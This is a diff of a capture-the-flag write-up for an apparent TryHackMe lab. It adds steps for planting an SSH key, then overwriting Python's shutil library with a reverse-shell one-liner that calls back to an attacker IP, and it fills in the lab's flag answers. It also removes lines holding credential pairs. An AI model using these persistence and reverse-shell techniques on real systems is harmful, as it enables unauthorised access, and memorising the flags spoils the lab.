@@ -43,14 +43,36 @@ After a while I saw something interesting inside the code of `/opt/getDreams.py`
  ![image](https://github.com/user-attachments/assets/ed5e3baf-e98e-4d13-b471-e5a8edcf9817)<br />
 Now let's insert a command to spawn a shell!<br />
 ![image](https://github.com/user-attachments/assets/781269c1-feb7-4e66-8973-d556b60706ee)<br />
-It kinda worked, but the shell is not very interactive. 
+It kinda worked, but the shell is not very interactive; the command works, but the shell doesn't give the answers back. So one way to make it interactive, is to use ssh:
+<br />
+On the attacker's machine: 
+
+    ssh-keygen -t rsa -b 4096
+On the target machine: 
+
+    mkdir /home/death/.ssh
+    echo "PUBKEY" > home/death/.ssh/authorized_keys
+
+Finally, on the attacker's machine:<br />
+
+    ssh -i keys death@10.10.1.99
+And we have our interactive shell: <br />
+![image](https://github.com/user-attachments/assets/e0153745-d255-49c2-ae7a-76ee2bf6a6bd)<br />
+As death, we can now read his password from the `getDream.py` file:<br />
+![image](https://github.com/user-attachments/assets/71a959b6-3513-435c-b01a-86ed8dc95d29)<br />
+Now, if we look inside morpheus' home directory, we can see a .py file that we can read:<br />
+![image](https://github.com/user-attachments/assets/4e69109e-7921-4d69-ade4-45267b49ca99)<br />
+This file imports the shutil library, to which the death user has write access:<br />
+![image](https://github.com/user-attachments/assets/f6038e64-7636-411d-b2c9-837bdf15ca66)<br />
+We can then overwite this library with a reverse shell, and open a netcat listener, to check if this backup operation is actually a cronjob. Run `echo "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.90.188",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")" > /usr/lib/python3.8/shutil.py` and then on the attacker's machine `nc -lnvp 8888`, wait a minute and get morpheus flag :) 
+
+
+
+
 
 - What is the Lucien Flag? `THM{TH3_L1BR4R14N}`
-- What is the Death Flag?
-- What is the Morpheus Flag?
+- What is the Death Flag? `THM{1M_TH3R3_4_TH3M}`
+- What is the Morpheus Flag? `THM{DR34MS_5H4P3_TH3_W0RLD}`
 
-admin:password
 
-lucien:HeyLucien#@1999!
 
-lucien:lucien42DBPASSWORD
